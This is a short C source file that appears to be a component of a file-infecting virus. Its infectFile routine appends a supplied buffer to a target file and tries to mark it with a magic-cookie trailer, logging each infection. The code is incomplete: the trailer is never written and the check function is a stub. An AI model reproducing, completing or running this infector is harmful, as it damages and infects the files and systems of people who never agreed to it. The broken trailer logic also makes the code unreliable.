#include "config.h"

#include <stdio.h>
#include <stdlib.h>

#include "log.h"


#define MAGIC_COOKIE 0xACAB28491

typedef struct _trailer
{
    unsigned long long int magicNr;
    unsigned int *rlEntryPt;
} trailer_t;


static int appendTrailer(FILE *fp)
{
    trailer_t *trl = calloc(1, sizeof(trailer_t));

    if (trl == NULL) return (ERR_OMEM);
    if (fp == NULL) return (ERR_FAIL);
    trl->magicNr = MAGIC_COOKIE;
    trl->rlEntryPt = NULL;
    if (fseek(fp, 0L - sizeof(trailer_t), SEEK_END) != 0) return (ERR_FAIL);
    free(trl);
    return (ERR_OK);
}

static int checkTrailer(FILE *fp)
{
    return (ERR_OK);
}

static int appendBuf2Fp(char *buf, size_t siz, FILE *fp)
{
    if (fseek(fp, 0L, SEEK_END) != 0) return (ERR_FAIL);
    fwrite(buf, 1, siz, fp);
    fflush(fp);
    return (ERR_OK);
}

int infectFile(char *buf, size_t siz, char *target)
{
    FILE *fp;

    fp = fopen(target, "ab");
    if (!fp) return (ERR_FAIL);
    D("infecting file '%s'\n", target);
    if (appendBuf2Fp(buf, siz, fp) == ERR_OK)
    {
        if (appendTrailer(fp) == ERR_OK)
        {
            D("file '%s' infected", target);
        }
        else
        {
            E2("appendTrailer() failed");
            goto fail;
        }
    }
    else
    {
        E2("appendBuf2Fp() failed");
        goto fail;
    }
    if (fclose(fp) != 0) return (ERR_FAIL);
    return (ERR_OK);
fail:
    fclose(fp);
    return (ERR_FAIL);
}
